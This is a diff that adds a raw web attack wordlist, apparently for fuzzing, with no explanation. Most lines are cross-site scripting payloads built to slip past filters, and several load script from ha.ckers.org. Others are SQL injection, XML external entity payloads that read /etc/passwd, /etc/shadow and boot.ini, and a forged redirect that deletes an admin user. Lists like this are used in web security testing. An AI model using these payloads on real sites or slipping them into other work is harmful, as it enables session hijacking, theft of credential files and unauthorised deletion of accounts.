@@ -1,0 +1,76 @@
+'); alert('xss'); var x='
+\\'); alert(\'xss\');var x=\'
+'>//\\,<'>">">"*"
+'); alert('XSS
+window.alert("Bonjour !");
+'>><marquee><h1>XSS</h1></marquee>
+'">><marquee><h1>XSS</h1></marquee>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http://1113982867/">XSS</A>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
+" onfocus=alert(document.domain) "> <"
+perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out
+perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
+&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
+&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
+&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;SCRIPT&gt;a=/XSS/
+&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
+
+<br SIZE="&{document.vulnerable=true}">
+1script3document.vulnerable=true;1/script3
+<a href="javascript#document.vulnerable=true;">
+&{document.vulnerable=true;};
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+<;/script>;<;script>;alert(1)<;/script>;
+<;scrscriptipt>;alert(1)<;/scrscriptipt>;
+<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
+perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out
+perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+XSS STYLE=xss:e/**/xpression(alert('XSS'))>
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+<;/script>;<;script>;alert(1)<;/script>;
+%3cscript%3ealert('XSS')%3c/script%3e
+%22%3e%3cscript%3ealert('XSS')%3c/script%3e
+'';!--"<XSS>=&{()}
+<BR SIZE="&{alert('XSS')}">
+¼script¾alert(¢XSS¢)¼/script¾
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+<A HREF="http://66.102.7.147/">XSS</A>
